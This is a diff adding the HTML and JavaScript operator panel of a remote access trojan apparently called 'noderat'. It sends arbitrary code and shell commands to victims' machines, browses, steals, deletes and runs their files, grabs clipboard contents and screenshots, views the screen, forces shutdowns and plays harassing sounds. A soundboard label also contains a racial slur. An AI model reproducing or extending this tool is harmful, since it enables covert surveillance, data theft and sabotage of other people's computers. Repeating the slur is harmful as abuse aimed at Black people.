@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="index.css">
+
+    <script src="/get_socket.io.js"></script>
+
+    
+    <script>
+        var socket=io('http://localhost:65352')
+        var common_sounds={
+            'stop sound':'https://cdn.discordapp.com/attachments/917663984319102996/924246503734804501/stopsound.wav',
+            'discord message':'https://cdn.discordapp.com/attachments/871110676045791242/922372945786048592/discord-notification.wav',
+            'discord call':'https://cdn.discordapp.com/attachments/871110676045791242/922373761968267284/discord-call-sound.wav',
+            'rare discord call':'https://cdn.discordapp.com/attachments/871110676045791242/922391874151518238/discord-call-remix-extended_qisxy7ss.wav',
+            'niggers niggers niggers': 'https://cdn.discordapp.com/attachments/871110676045791242/922377812785123338/niggs.wav',
+            'bandana - bassboost earrape':'https://cdn.discordapp.com/attachments/871110676045791242/922377499705495572/bassboost.wav',
+            'we are number 1 - bassboost earrape':'https://cdn.discordapp.com/attachments/871110676045791242/922377666701692959/bassboost2.wav',
+            'amogus drip':'https://cdn.discordapp.com/attachments/871110676045791242/922378378282156052/2021-04-07-213841761.wav',
+            'za warudo - earrape':'https://cdn.discordapp.com/attachments/871110676045791242/922396783521460254/zawarudo.wav',
+            'the rock eye brow raise - earrape':'https://cdn.discordapp.com/attachments/917663984319102996/919238794635509830/fucking_pig.wav',
+            'fortnite dance - bassboosted earrape':'https://cdn.discordapp.com/attachments/917663984319102996/924230321141071872/fortnite-default-dance-bass-boosted.wav',
+            'subway surfers - bassboosted':'https://cdn.discordapp.com/attachments/917663984319102996/924231026241318942/subway-surfer-bass-boosted.wav',
+            'super idol - bassboosted':'https://cdn.discordapp.com/attachments/917663984319102996/924231450574852116/super-idol-bass-boosted.wav'
+        }
+        USER={}
+        tobeadded_topath=''
+        curpath='C:/'
+        socket.on('user_std',res=>{
+            console.log(res)
+            if (typeof res=='object'){
+                try{
+                res=JSON.stringify(res,null,4)
+            }catch{res='[this meant to be an object that failed to be parsed. Check your cli to see it as it should look]'}}
+            document.getElementById('std_out').innerText+=res+'\n'
+
+        })
+
+        function execonuser (path) {
+            var it=0
+            while(path.indexOf('\\')>-1&&it<300){path=path.replace('\\','/');it++}
+            evalonuser('runbash(`start "x" "'+path+'"`)')
+        }
+
+        var rls=()=>{}
+
+        socket.on('pathload_result',contents=>{
+            var cts=
+                    "<tr><th>"
+                    +'Folder'
+                    +'</th><th>'
+                    +'..'
+                    +'</th><th>'
+                    +`<button class="btn btn-dark" style="height: 32px;width:80px;"onclick="tobeadded_topath='../';document.getElementById('fxp_loading').style.top='550px';setTimeout(()=>{document.getElementById('fxp_loading').style.top='-5000px'},4000)">Open</button>  `
+                    +"</th></tr>"
+            contents.forEach(v => {
+                cts+=
+                    "<tr><th>"
+                    +(v.t?'Folder':'File')
+                    +'</th><th>'
+                    +v.n
+                    +'</th><th>'
+                        
+                    +(v.t?`<button class="btn btn-dark" style="height: 32px;width:100px;"onclick="tobeadded_topath='${v.n}/';document.getElementById('fxp_loading').style.top='550px';setTimeout(()=>{document.getElementById('fxp_loading').style.top='-5000px';},4000)">Open</button>  `:`<button class="btn btn-dark" style="height: 32px;width:100px;" onclick="confirm('Are you sure that you want to download ${v.n}? As soon as it finishes downloading you will hear a sound. It will be saved into receivedFiles. Press View received files to view it')?evalonuser(\`uploadFile('\${curpath}${v.n}')\`):1">Download</button>  `)
+                    +(v.t?'':`<button class="btn btn-dark" style="height: 32px;width:100px;" onclick="confirm('Are you sure that you want to execute ${v.n}?')?execonuser(\`\${curpath}${v.n}\`):1">Execute</button>  `)
+                    +`<button class="btn btn-dark" style="height: 32px;width:100px;" onclick="var a=prompt('How would you like to rename ${v.n}? If nothing is typed or contains illegal chars then you wont rename it');a!=''&&a!==null?evalonuser(\`fs.renameSync('\${curpath}${v.n}','\${curpath+a}')\`):1">Rename</button>  `
+                    +`<button class="btn btn-dark" style="height: 32px;width:100px;" onclick="confirm('Are you sure that you want to delete ${v.n}? This action is irreversable!')?evalonuser(\`${v.t?'fs.rmdirSync':'fs.unlinkSync'}('\${curpath}${v.n}'${v.t?',{recursive:true}':''})\`):1">Delete</button>`
+                    +"</th></tr>"
+            });
+            if (tobeadded_topath=='../'){
+                var lp=(curpath+'../').split('/')
+                lp.pop()
+                lp.length>1?lp.pop():1
+                lp.pop()
+                curpath=lp.join('/')
+            }
+            else{
+
+                curpath+=tobeadded_topath
+            }
+            curpath.endsWith('/')?1:curpath+='/'
+            tobeadded_topath=''
+            
+            var fxppathspan=document.getElementById('fxp_path')
+            fxppathspan.innerText='File explorer: '+curpath
+            var fxpbody=document.getElementById('filestbl')
+            
+            fxpbody.innerHTML=cts
+        })
+        setInterval(()=>{
+            document.getElementById('fxp_main').style.top=='-5000px'?1:socket.emit('loadPath',curpath)
+        },1000)
+        function disconectuser() {
+            var pmt = confirm("Are you sure that you want to disconnect "+USER.pcname+" from noderat server")
+            if (!pmt) {return}
+            socket.emit("evalOnUser",USER.pcname,'process.exit()')
+            //console.log(electron)
+        }
+        function evalonuser (str) {
+            socket.emit("evalOnUser",USER.pcname,str)
+        }
+        
+        window.onload=()=>{
+            socket.emit("appready",1)
+            socket.emit('getuserInfo')
+            socket.on('usercontrolmenuopen_result',s=>s==0?alert('this user is no longer connected. Check the main menu to see the list of connected users'):1)
+
+            
+        }
+        socket.on("userinfo_result",info=>{
+            try {
+            USER = info
+            if(USER=='user is not connected'){
+                document.body.innerHTML='<span style="color:#009b22">This user is not connected. Check the main menu to see the list of connected users</span>'
+            }
+            document.getElementsByClassName("title")[0].innerText = USER.pcname +" action panel"
+            document.getElementsByClassName("title")[1].innerText = USER.pcname +" action panel"
+            document.getElementById('viewscreen').href='http://localhost:65352/viewScreen?u='+USER.pcname
+            }catch{}
+
+        })
+
+        function getScreenshot () {
+            evalonuser('screenshot()')
+            setTimeout(evalonuser,2000,'uploadFile("screen_shot.jpg")')
+        }
+        
+    </script>
+    
+    <meta charset="utf-8">
+    <title class="title">Loading user info</title>
+</head>
+<body>
+    <h3 class="title">Loading user...</h3>
+    <div>
+    
+        <button type="button" class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 189px;left:20px;width:185px" onclick="evalonuser(document.getElementById('evalinput').value)">Eval on user</button>
+        <input id="sendmsgbox" class="form-control" style="position: absolute;top: 226px;left:20px;width:185px;background-color: black;color: #009B22;border: 2px solid #009B22;" placeholder="msg box contents"></input>
+        <button class="btn btn-primary" id="bb4" style="height: 32px; position: absolute;top: 267px;left:20px;width:185px;" onclick="evalonuser('msgbox(\''+document.getElementById('sendmsgbox').value+'\')')">open MSG box</button>
+        <input id="openwebsiteorapp" class="form-control" style="position: absolute;top: 150px;left:210px;width:185px;background-color: black;color: #009B22;border: 2px solid #009B22;" placeholder="website url or file path"></input>
+        <button class="btn btn-primary" id="bb4" style="height: 32px; position: absolute;top: 189px;left:210px;width:185px;" onclick="evalonuser('open(\''+document.getElementById('openwebsiteorapp').value+'\')')">open website or file</button>
+        <input id="runcmd" class="form-control" style="position: absolute;top: 226px;left:210px;width:185px;background-color: black;color: #009B22;border: 2px solid #009B22;" placeholder="Powershell command"></input>
+        <button class="btn btn-primary" id="bb4" style="height: 32px; position: absolute;top: 350px;left:210px;width:185px;" onclick="document.getElementById('snd_main').style.top='100px'">Open soundboard</button>
+        <div id="snd_main"  style="position: absolute;top: -5000px;left:1100px;width: 200px;height: 550px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+            <input id="runwav" class="form-control" style="position:absolute;top: 307px;width:195px;background-color: black;color: #009B22;border: 2px solid #009B22;" placeholder=".wav file path or url"></input>
+            <!-- <span style="position: absolute;top: 385px;left:2px;height:50px;font-size: 13px;width: 190px;background-color: black;color: #009B22;border: 1px solid #009B22;text-align: right;"></span> -->
+            <input id="fullsoundvolume" type="number"  class="form-control" placeholder="sound volume %" style="position:absolute;left: 2px;top: 390px;width:190px;height:30px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+            <button class="btn btn-primary" id="bb4" style="position:absolute;height: 32px;top: 420px;width:195px;" onclick="evalonuser(`tobewrittentomainps1+='[audio]::Volume=${ Math.min(Math.max(Math.floor(document.getElementById('fullsoundvolume').value), 0), 100)/100}\\n[audio]::Mute=$false\\n'`)">Set sound volume</button>
+            <button class="btn btn-primary" id="bb4" style="position:absolute;height: 32px;top: 350px;width:195px;" onclick="evalonuser('runWav(\''+document.getElementById('runwav').value+'\')')">Run a .wav file/url</button>
+            <button class="btn btn-primary" id="bb4" style="position:absolute;height: 32px;top: 515px;width:195px;" onclick="document.getElementById('snd_main').style.top='-5000px'">Hide soundboard</button>
+            <div id="snd_buttons"style="max-height: 300px;overflow-y: scroll;width: 205px;">
+                
+            </div>
+            <script>
+                var htmlstr=''
+                for(var k in common_sounds)htmlstr+=`<button class="form-control" id="bb4" onclick="evalonuser('runWav(\`${common_sounds[k]}\`)')">${k}</button>\n`
+                document.getElementById('snd_buttons').innerHTML=htmlstr
+                </script>
+        
+    </div>
+    
+    <button class="btn btn-primary" id="bb4" style="height: 32px; position: absolute;top: 267px;left:210px;width:185px;" onclick="evalonuser('runbash(\''+document.getElementById('runcmd').value+'\')')">Run cmd command</button>
+    <button class="btn btn-dark" id="bb3" style=" position: absolute;top: 170px;left:420px;width: 185px;height: 100px" onclick="getScreenshot()">Make a screenshot</button>
+    <button class="btn btn-dark" id="bb3" style=" position: absolute;top: 170px;left:610px;width: 185px;height: 100px" onclick="socket.emit('openrecfiles',USER.pcname)">View received files</button>
+    <a id="viewscreen" target="_blank" href="localhost:65352"><button class="btn btn-dark" id="bb3" style=" position: absolute;top: 170px;left:800px;width: 185px;height: 100px" >View screen</button></a>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 315px; left:20px;width: 185px;" onclick="confirm('clipboard will be saved to received files. It can overwrite the previous clipboard. Are you sure that you want to get their clipboard?')?evalonuser('getClipboard(()=>uploadFile(`clipboard.txt`))'):1">Get clipboard</button>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 315px; left:210px;width: 185px;" onclick="confirm('Device list would be uploaded to receivedFiles as devlist.txt')?evalonuser('uploadFile(process.env.SystemDrive+`/devlist.txt`)'):1">Get device list</button>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 350px; left:20px;width: 185px;" onclick="disconectuser()">Disconnect user</button>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 385px; left:20px;width: 185px;" onclick="confirm('are you sure that you want to melt their screen?')?evalonuser('meltscreen()'):1">Melt their screen</button>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 385px; left: 210px;width: 185px;" onclick="evalonuser('unmeltscreen()')">Unmelt their screen</button>
+    
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 420px; left:20px;width: 185px;" onclick="confirm('are you sure that you want to kill explorer.exe on their machine?')?evalonuser('killexplorer()'):1">Kill explorer.exe</button>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 420px; left: 210px;width: 185px;" onclick="evalonuser('reviveexplorer()')">Spawn explorer.exe</button>
+    
+    <input id="shutdownIn" type="number" class="form-control" style="position: absolute;top: 455px;left:20px;width: 280px;background-color: black;color: #009B22;border: 2px solid #009B22;" placeholder="time in seconds before Shutdown"></input>
+    <span style="position: absolute;top: 460px;left:310px;width: 280px;background-color: black;color: #009B22;border: 0px solid #009B22;">Default: 60 seconds</span>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 495px; left:20px;width: 325px;" onclick="confirm('are you sure that you want to shutdown their machine? You can cancel the shutdown by clicking cancel shutdown button.')?evalonuser(`shutdown(\'/s /t ${document.getElementById('shutdownIn').value||60}\')`):1">Shutdown after given amount of seconds</button>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 495px; left:350px;width: 185px;" onclick="confirm('are you sure that you want to shutdown their machine? This will lead to a temporary disconnection')?evalonuser('shutdown()'):1">Shutdown right now</button>
+    <button class="btn btn-dark" id="bb3" style="height: 32px; position: absolute;top: 495px; left:540px;width: 185px;" onclick="evalonuser('shutdown(`/a`)')">Cancel shutdown</button>
+    <button class="btn btn-dark" id="bb3" style=" position: absolute;top: 300px;left:610px;width: 185px;height: 100px" onclick="document.getElementById('std_main').style.top='550px'">View console</button>
+    
+    <button class="btn btn-dark" id="bb3" style=" position: absolute;top: 300px;left:420px;width: 185px;height: 100px" onclick="document.getElementById('fxp_main').style.top='550px'">View their file system</button>
+    <textarea id="evalinput" class="form-control" style="position: absolute;height: 40px;top: 150px;left:20px;width: 185px;background-color: black;color: #009B22;border: 2px solid #009B22; resize:both" placeholder="run js code on user"></textarea>
+    <div id="fxp_main" style="position: absolute;top: -5000px;left:25px;width: 700px;height: 600px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <button class="btn btn-dark" style="height: 32px; position: relative;top: 550px; left: 10px;width: 180px;" onclick="document.getElementById('fxp_main').style.top='-5000px'">Hide file explorer</button>
+        <button class="btn btn-dark" style="height: 32px; position: relative;top: 550px; left: 10px;width: 250px;" onclick="var url=prompt('Please enter a url to that file. Press cancel to cancel'); var fname=prompt('Please type in what the name of that file would be. Press cancel to cancel'); url!==null&&url!==''&&fname!==null&&fname!==''?evalonuser(`downloadFile('${url}','${curpath+fname}')`):1">Upload a file into this folder</button>
+        <button class="btn btn-dark" style="height: 32px; position: relative;top: 550px; left: 10px;width: 240px;" onclick="var fname=prompt('Please type in what the name of that folder would be. If the folder already exists or folder name contains illegal chars it will not be created. Press cancel to cancel');fname!==null&&fname!==''?evalonuser(`fs.mkdirSync('${curpath+fname}')`):1">Create a folder in this directory</button>
+        <input style="position:relative;top:25px; width:400px;background-color: black;color: #009B22;border: 2px solid #009B22;" id="goto_path"  placeholder="goto path"></input>
+            <button style="position: relative; top: 25px;" onclick="curpath=document.getElementById('goto_path').value;document.getElementById('fxp_loading').style.top='550px';setTimeout(()=>{document.getElementById('fxp_loading').style.top='-5000px';},3000)">→</button>
+        <h3 id="fxp_path" style="position: relative;top: -50px;">File explorer:</h3>
+        <div style="max-height: 425px;overflow-y: scroll;width: 700px;">
+            <table class="table">
+                <thead class="thead-dark" style="border-collapse:collapse;border-spacing:0;">
+                    <tr>
+                      <th scope="File or folder">
+                        File or folder
+                      </th>
+                      <th scope="name">
+                        Name
+                      </th>
+                      <th scope="actions">
+                        Actions
+                      </th>
+                    </tr>
+                  </thead>
+                  <tbody id="filestbl">
+                   
+                  </tbody>
+              </table>
+        </div>
+    </div>
+    <div id="fxp_loading" style="position: absolute;top: -5000px;left:25px;width: 700px;height: 600px;background-color: black;color: #009B22;border: 2px solid #009B22;">Loading... Please wait</div>
+    <div id="std_main" style="position: absolute;top: -5000px;left:800px;width: 400px;height: 600px;background-color: black;color: #009B22;border: 2px solid #009B22;">
+        <button class="btn btn-dark" style="height: 32px; position: relative;top: 550px; left: 40px;width: 150px;" onclick="document.getElementById('std_main').style.top='-5000px'">Hide console</button>
+        <div id="std_out" style="max-height: 500px;overflow-y: scroll;">
+            info and return results console<br><br></div>
+    </div>
+    
+    
+</div>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+</html>
